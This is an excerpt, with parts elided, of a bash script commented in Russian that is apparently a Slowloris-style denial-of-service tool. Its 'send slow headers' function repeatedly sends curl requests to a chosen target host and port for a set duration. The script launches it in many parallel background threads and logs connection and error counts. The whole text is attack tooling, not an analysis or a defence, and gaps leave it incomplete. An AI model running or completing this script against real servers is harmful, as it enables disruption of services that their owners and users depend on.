...
# Функция для отправки медленных HTTP-заголовков
send_slow_headers() {
    local target=$1
    local port=$2
    local duration=$3
    ...
    while [ $(($(date +%s) - start_time)) -lt $duration ]; do
        if curl -s -N -H "X-a: b" http://$target:$port/ > /dev/null 2>&1; then
    ...
    echo "{\"thread_id\": $thread_id, \"connections\": $connections, \"errors\": $errors, \"duration\": $duration}"
}
...
for ((i=0; i<THREADS; i++)); do
    send_slow_headers "$TARGET" "$PORT" "$DURATION" "$i" >> "$TEMP_FILE" &
    pids[$i]=$!
done
